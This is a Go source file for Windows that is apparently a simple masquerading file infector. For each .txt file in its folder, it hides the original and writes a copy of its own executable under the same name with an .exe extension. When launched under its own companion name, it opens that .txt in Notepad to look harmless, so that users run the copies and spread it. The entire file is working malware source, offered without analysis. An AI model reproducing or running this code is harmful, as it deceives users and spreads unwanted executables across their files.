package main

import (
	"io/ioutil"
	"log"
	s "strings"
	"os"
	"os/exec"
	"io"
	"path/filepath"
	"syscall"
)

func main() {

	files, err := ioutil.ReadDir(".")
	if err != nil {
		log.Fatal(err)
	}
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
	if err != nil {
		log.Fatal(err)
	}
	for _, file := range files {
		if (s.HasSuffix(file.Name(), ".txt")){
			if (filepath.Join(dir,file.Name()) == os.Args[0][:len(os.Args[0])-4]+".txt"){
				runNotepad()
			} else {
				CreateHiddenFile(file.Name())
				copyExe(file.Name())
			}
		}
	}
}

func runNotepad()  {
	//cmd := exec.Command(path)
	cmd := exec.Command("notepad.exe ", os.Args[0][:len(os.Args[0])-4]+".txt")
	cmd.Run()

}

func copyFile(from string, to string) {
	originalFile, err := os.Open(from)
	if err != nil {
		log.Fatal(err)
	}
	defer originalFile.Close()

	// Create new file
	newFile, err := os.Create(to)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	bw, err := io.Copy(newFile, originalFile)
	if err != nil {
		log.Fatal(err, bw)
	}

	// Commit the file contents
	// Flushes memory to disk
	err = newFile.Sync()
	if err != nil {
		log.Fatal(err)
	}
}

func copyExe(name string)  {
	originalFile, err := os.Open(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}
	defer originalFile.Close()

	// Create new file
	newFile, err := os.Create(name[:len(name)-4] + ".exe")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	// Copy the bytes to destination from source
	bw, err := io.Copy(newFile, originalFile)
	if err != nil {
		log.Fatal(err, bw)
	}

	// Commit the file contents
	// Flushes memory to disk
	err = newFile.Sync()
	if err != nil {
		log.Fatal(err)
	}
}

func CreateHiddenFile(name string) (*os.File, error) {
	nameptr, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return nil, err
	}
	f, err := os.Open(name)
	if err != nil {
		return nil, err
	}

	// Do whatever windows calls are needed to change
	// the file into a hidden file; something like
	err = syscall.SetFileAttributes(nameptr, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		os.Remove(name) // XXX do we want to remove it? check for error
		f.Close()                 // XXX check error
		return nil, err
	}

	return f, nil
}
